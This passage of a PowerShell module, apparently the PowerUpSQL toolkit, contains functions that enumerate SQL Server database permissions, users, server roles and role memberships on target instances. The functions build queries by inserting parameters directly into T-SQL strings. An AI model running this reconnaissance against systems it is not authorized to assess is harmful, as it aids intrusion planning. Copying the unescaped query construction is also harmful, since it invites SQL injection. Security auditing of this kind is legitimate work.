        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission name to filter for.')]
        [string]$PermissionName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission type to filter for.')]
        [string]$PermissionType,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name for grantee to filter for.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Don't select permissions for default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDatabasePrivs = New-Object -TypeName System.Data.DataTable

        # Setup PermissionName filter
        if($PermissionName)
        {
            $PermissionNameFilter = " and pm.permission_name like '$PermissionName'"
        }
        else
        {
            $PermissionNameFilter = ''
        }

        # Setup PermissionName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and rp.name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }

        # Setup PermissionType filter
        if($PermissionType)
        {
            $PermissionTypeFilter = " and pm.class_desc like '$PermissionType'"
        }
        else
        {
            $PermissionTypeFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get the privs for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Set DatabaseName filter
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                rp.name as [PrincipalName],
                rp.type_desc as [PrincipalType],
                pm.class_desc as [PermissionType],
                pm.permission_name as [PermissionName],
                pm.state_desc as [StateDescription],
                ObjectType = CASE
                WHEN obj.type_desc IS NULL
                OR obj.type_desc = 'SYSTEM_TABLE' THEN
                pm.class_desc
                ELSE
                obj.type_desc
                END,
                [ObjectName] = Isnull(ss.name, Object_name(pm.major_id))
                FROM   $DbName.sys.database_principals rp
                INNER JOIN $DbName.sys.database_permissions pm
                ON pm.grantee_principal_id = rp.principal_id
                LEFT JOIN $DbName.sys.schemas ss
                ON pm.major_id = ss.schema_id
                LEFT JOIN $DbName.sys.objects obj
                ON pm.[major_id] = obj.[object_id] WHERE 1=1
                $PermissionTypeFilter
                $PermissionNameFilter
            $PrincipalNameFilter"

            # Execute Query
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing permissions for the $DbName database..."
            }

            $TblDatabaseTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblDatabasePrivs = $TblDatabasePrivs + $TblDatabaseTemp
        }
    }

    End
    {
        # Return data
        $TblDatabasePrivs
    }
}


# ----------------------------------
#  Get-SQLDatabaseUser
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabaseUser
{
    <#
            .SYNOPSIS
            Returns database user information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER DatabaseUser
            Database user to filter for.
            .PARAMETER PrincipalName
            Principal name to filter for.
            .PARAMETER NoDefaults
            Only show information for non default databases.

            .EXAMPLE
            PS C:\> Get-SQLDatabaseUser -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PrincipalName evil

            ComputerName       : SQLServer1
            Instance           : SQLServer1\STANDARDDEV2014
            DatabaseName       : testdb
            DatabaseUserId     : 5
            DatabaseUser       : evil
            PrincipalSid       : 3E26CA9124B4AE42ABF1BBF2523738CA
            PrincipalName      : evil
            PrincipalType      : SQL_USER
            deault_schema_name : dbo
            create_date        : 04/22/2016 13:00:33
            is_fixed_role      : False
            [TRUNCATED]
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseUser -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database user.')]
        [string]$DatabaseUser,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Server login.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDatabaseUsers = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabaseUsers.Columns.Add('ComputerName')
        $null = $TblDatabaseUsers.Columns.Add('Instance')
        $null = $TblDatabaseUsers.Columns.Add('DatabaseName')
        $null = $TblDatabaseUsers.Columns.Add('DatabaseUserId')
        $null = $TblDatabaseUsers.Columns.Add('DatabaseUser')
        $null = $TblDatabaseUsers.Columns.Add('PrincipalSid')
        $null = $TblDatabaseUsers.Columns.Add('PrincipalName')
        $null = $TblDatabaseUsers.Columns.Add('PrincipalType')
        $null = $TblDatabaseUsers.Columns.Add('deault_schema_name')
        $null = $TblDatabaseUsers.Columns.Add('create_date')
        $null = $TblDatabaseUsers.Columns.Add('is_fixed_role')

        # Setup PrincipalName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and b.name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }

        # Setup DatabaseUser filter
        if($DatabaseUser)
        {
            $DatabaseUserFilter = " and a.name like '$DatabaseUser'"
        }
        else
        {
            $DatabaseUserFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }


        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }

        # Get the privs for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Set DatabaseName filter
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing database users from $DbName."
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                a.principal_id as [DatabaseUserId],
                a.name as [DatabaseUser],
                a.sid as [PrincipalSid],
                b.name as [PrincipalName],
                a.type_desc as [PrincipalType],
                default_schema_name,
                a.create_date,
                a.is_fixed_role
                FROM    [sys].[database_principals] a
                LEFT JOIN [sys].[server_principals] b
                ON a.sid = b.sid WHERE 1=1
                $DatabaseUserFilter
            $PrincipalNameFilter"

            # Execute Query
            $TblDatabaseUsersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Update sid formatting for each entry and append results
            $TblDatabaseUsersTemp |
            ForEach-Object -Process {
                # Convert SID to string
                if($_.PrincipalSid.GetType() -eq [System.DBNull])
                {
                    $Sid = ''
                }
                else
                {
                    # Format principal sid
                    $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
                    if ($NewSid.length -le 10)
                    {
                        $Sid = [Convert]::ToInt32($NewSid,16)
                    }
                    else
                    {
                        $Sid = $NewSid
                    }
                }

                # Add results to table
                $null = $TblDatabaseUsers.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.DatabaseUserId,
                    [string]$_.DatabaseUser,
                    $Sid,
                    [string]$_.PrincipalName,
                    [string]$_.PrincipalType,
                    [string]$_.default_schema_name,
                    [string]$_.create_date,
                [string]$_.is_fixed_role)
            }
        }
    }

    End
    {
        # Return data
        $TblDatabaseUsers
    }
}


# ----------------------------------
#  Get-SQLServerRole
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerRole
{
    <#
            .SYNOPSIS
            Returns SQL Server role information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER RolePrincipalName
            Role principal name to filter for.
            .PARAMETER RoleOwner
            Role owner name to filter for.
            .EXAMPLE
            PS C:\> Get-SQLServerRole -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1

            ComputerName          : SQLServer1
            Instance              : SQLServer1\STANDARDDEV2014
            RolePrincipalId       : 2
            RolePrincipalSid      : 2
            RolePrincipalName     : public
            RolePrincipalType     : SERVER_ROLE
            OwnerPrincipalId      : 1
            OwnerPrincipalName    : sa
            is_disabled           : False
            is_fixed_role         : False
            create_date           : 4/13/2009 12:59:06 PM
            modify_Date           : 4/13/2009 12:59:06 PM
            default_database_name :
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerRole -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Role owner's name.")]
        [string]$RoleOwner,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup table for output
        $TblServerRoles = New-Object -TypeName System.Data.DataTable
        $null = $TblServerRoles.Columns.Add('ComputerName')
        $null = $TblServerRoles.Columns.Add('Instance')
        $null = $TblServerRoles.Columns.Add('RolePrincipalId')
        $null = $TblServerRoles.Columns.Add('RolePrincipalSid')
        $null = $TblServerRoles.Columns.Add('RolePrincipalName')
        $null = $TblServerRoles.Columns.Add('RolePrincipalType')
        $null = $TblServerRoles.Columns.Add('OwnerPrincipalId')
        $null = $TblServerRoles.Columns.Add('OwnerPrincipalName')
        $null = $TblServerRoles.Columns.Add('is_disabled')
        $null = $TblServerRoles.Columns.Add('is_fixed_role')
        $null = $TblServerRoles.Columns.Add('create_date')
        $null = $TblServerRoles.Columns.Add('modify_Date')
        $null = $TblServerRoles.Columns.Add('default_database_name')

        # Setup owner filter
        if ($RoleOwner)
        {
            $RoleOwnerFilter = " AND suser_name(owning_principal_id) like '$RoleOwner'"
        }
        else
        {
            $RoleOwnerFilter = ''
        }

        # Setup role name
        if ($RolePrincipalName)
        {
            $PrincipalNameFilter = " AND name like '$RolePrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "SELECT   '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            principal_id as [RolePrincipalId],
            sid as [RolePrincipalSid],
            name as [RolePrincipalName],
            type_desc as [RolePrincipalType],
            owning_principal_id as [OwnerPrincipalId],
            suser_name(owning_principal_id) as [OwnerPrincipalName],
            is_disabled,
            is_fixed_role,
            create_date,
            modify_Date,
            default_database_name
            FROM [master].[sys].[server_principals] WHERE type like 'R'
            $PrincipalNameFilter
        $RoleOwnerFilter"

        # Execute Query
        $TblServerRolesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Update sid formatting for each entry
        $TblServerRolesTemp |
        ForEach-Object -Process {
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }

            # Add results to table
            $null = $TblServerRoles.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.RolePrincipalId,
                $Sid,
                $_.RolePrincipalName,
                [string]$_.RolePrincipalType,
                [string]$_.OwnerPrincipalId,
                [string]$_.OwnerPrincipalName,
                [string]$_.is_disabled,
                [string]$_.is_fixed_role,
                $_.create_date,
                $_.modify_Date,
            [string]$_.default_database_name)
        }
    }

    End
    {
        # Return data
        $TblServerRoles
    }
}


# ----------------------------------
#  Get-SQLServerRoleMember
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerRoleMember
{
    <#
            .SYNOPSIS
            Returns SQL Server role member information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER RolePrincipalName
            Role principal name to filter for.
            .PARAMETER PrincipalName
            Principal name to filter for.
            .EXAMPLE
            PS C:\> Get-SQLServerRoleMember -Instance SQLServer1\STANDARDDEV2014 -PrincipalName MyUser

            ComputerName      : SQLServer1
            Instance          : SQLServer1\STANDARDDEV2014
            RolePrincipalId   : 3
            RolePrincipalName : sysadmin
            PrincipalId       : 272
            PrincipalName     : MyUser

            ComputerName      : SQLServer1
            Instance          : SQLServer1\STANDARDDEV2014
            RolePrincipalId   : 6
            RolePrincipalName : setupadmin
            PrincipalId       : 272
            PrincipalName     : MyUser

            ComputerName      : SQLServer1
            Instance          : SQLServer1\STANDARDDEV2014
            RolePrincipalId   : 276
            RolePrincipalName : MyCustomRole
            PrincipalId       : 272
            PrincipalName     : MyUser
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerRoleMember -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL login or Windows account name.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerRoleMembers = New-Object -TypeName System.Data.DataTable

        # Setup role name filter
        if ($RolePrincipalName)
        {
            $RoleOwnerFilter = " AND SUSER_NAME(role_principal_id) like '$RolePrincipalName'"
        }
        else
        {
            $RoleOwnerFilter = ''
        }

        # Setup login name filter
        if ($PrincipalName)
        {
            $PrincipalNameFilter = " AND SUSER_NAME(member_principal_id) like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],role_principal_id as [RolePrincipalId],
            SUSER_NAME(role_principal_id) as [RolePrincipalName],
            member_principal_id as [PrincipalId],
            SUSER_NAME(member_principal_id) as [PrincipalName]
            FROM sys.server_role_members WHERE 1=1
            $PrincipalNameFilter
        $RoleOwnerFilter"

        # Execute Query
        $TblServerRoleMembersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append as needed
        $TblServerRoleMembers = $TblServerRoleMembers + $TblServerRoleMembersTemp
    }

    End
    {
        # Return role members
        $TblServerRoleMembers
    }
}


# ----------------------------------
#  Get-SQLDatabaseRole
# ----------------------------------
# Author: Scott Sutherland
# Reference: https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx
Function  Get-SQLDatabaseRole
{
    <#
            .SYNOPSIS
            Returns database role information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER NoDefaults
            Only select non default databases.
            .PARAMETER RolePrincipalName
            Role principalname to filter for.
            .PARAMETER RoleOwner
            Role owner's name to filter for.

            .EXAMPLE
            PS C:\> Get-SQLDatabaseRole -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -RolePrincipalName DB_OWNER

            ComputerName        : SQLServer1
            Instance            : SQLServer1\STANDARDDEV2014
            DatabaseName        : testdb
            RolePrincipalId     : 16384
            RolePrincipalSid    : 01050000000000090400000000000000000000000000000000400000
            RolePrincipalName   : db_owner
            RolePrincipalType   : DATABASE_ROLE
            OwnerPrincipalId    : 1
            OwnerPrincipalName  : sa
            is_fixed_role       : True
            create_date         : 4/8/2003 9:10:42 AM
            modify_Date         : 4/13/2009 12:59:14 PM
            default_schema_name :
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseRole -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Role owner's name.")]
        [string]$RoleOwner,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup table for output
        $TblDatabaseRoles = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabaseRoles.Columns.Add('ComputerName')
        $null = $TblDatabaseRoles.Columns.Add('Instance')
        $null = $TblDatabaseRoles.Columns.Add('DatabaseName')
        $null = $TblDatabaseRoles.Columns.Add('RolePrincipalId')
        $null = $TblDatabaseRoles.Columns.Add('RolePrincipalSid')
        $null = $TblDatabaseRoles.Columns.Add('RolePrincipalName')
        $null = $TblDatabaseRoles.Columns.Add('RolePrincipalType')
        $null = $TblDatabaseRoles.Columns.Add('OwnerPrincipalId')
        $null = $TblDatabaseRoles.Columns.Add('OwnerPrincipalName')
        $null = $TblDatabaseRoles.Columns.Add('is_fixed_role')
        $null = $TblDatabaseRoles.Columns.Add('create_date')
        $null = $TblDatabaseRoles.Columns.Add('modify_Date')
        $null = $TblDatabaseRoles.Columns.Add('default_schema_name')

        # Setup RoleOwner filter
        if ($RoleOwner)
        {
            $RoleOwnerFilter = " AND suser_name(owning_principal_id) like '$RoleOwner'"
        }
        else
        {
            $RoleOwnerFilter = ''
        }

        # Setup RolePrincipalName filter
        if ($RolePrincipalName)
        {
            $RolePrincipalNameFilter = " AND name like '$RolePrincipalName'"
        }
        else
        {
            $RolePrincipalNameFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose -NoDefaults
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Getting roles from the $DbName database."
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                principal_id as [RolePrincipalId],
                sid as [RolePrincipalSid],
                name as [RolePrincipalName],
                type_desc as [RolePrincipalType],
                owning_principal_id as [OwnerPrincipalId],
                suser_name(owning_principal_id) as [OwnerPrincipalName],
                is_fixed_role,
                create_date,
                modify_Date,
                default_schema_name
                FROM [$DbName].[sys].[database_principals]
                WHERE type like 'R'
                $RolePrincipalNameFilter
            $RoleOwnerFilter"

            # Execute Query
            $TblDatabaseRolesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Update sid formatting for each entry and append results
            $TblDatabaseRolesTemp |
            ForEach-Object -Process {
                # Format principal sid
                $NewSid = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
                if ($NewSid.length -le 10)
                {
                    $Sid = [Convert]::ToInt32($NewSid,16)
                }
                else
                {
                    $Sid = $NewSid
                }

                # Add results to table
                $null = $TblDatabaseRoles.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.RolePrincipalId,
                    $Sid,
                    $_.RolePrincipalName,
                    [string]$_.RolePrincipalType,
                    [string]$_.OwnerPrincipalId,
                    [string]$_.OwnerPrincipalName,
                    [string]$_.is_fixed_role,
                    $_.create_date,
                    $_.modify_Date,
                [string]$_.default_schema_name)
            }
        }
    }

    End
    {
        # Return data
        $TblDatabaseRoles
    }
}


# ----------------------------------
#  Get-SQLDatabaseRoleMember
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabaseRoleMember
{
    <#
            .SYNOPSIS
            Returns database role member information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER RolePrincipalName
            Role principalname to filter for.
            .PARAMETER PrincipalName
            Name of principal or Role to filter for.

            .EXAMPLE
            PS C:\> Get-SQLDatabaseRoleMember -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PrincipalName evil

            ComputerName      : SQLServer1
            Instance          : SQLServer1\STANDARDDEV2014
            DatabaseName      : testdb
            RolePrincipalId   : 16387
            RolePrincipalName : db_ddladmin
            PrincipalId       : 5
            PrincipalName     : evil

            ComputerName      : SQLServer1
            Instance          : SQLServer1\STANDARDDEV2014
            DatabaseName      : testdb
            RolePrincipalId   : 16391
            RolePrincipalName : db_datawriter
            PrincipalId       : 5
            PrincipalName     : evil
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseRoleMember -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL login or Windows account name.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDatabaseRoleMembers = New-Object -TypeName System.Data.DataTable

        # Setup login filter
        if ($PrincipalName)
        {
            $PrincipalNameFilter = " AND USER_NAME(member_principal_id) like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }

        # Setup role name
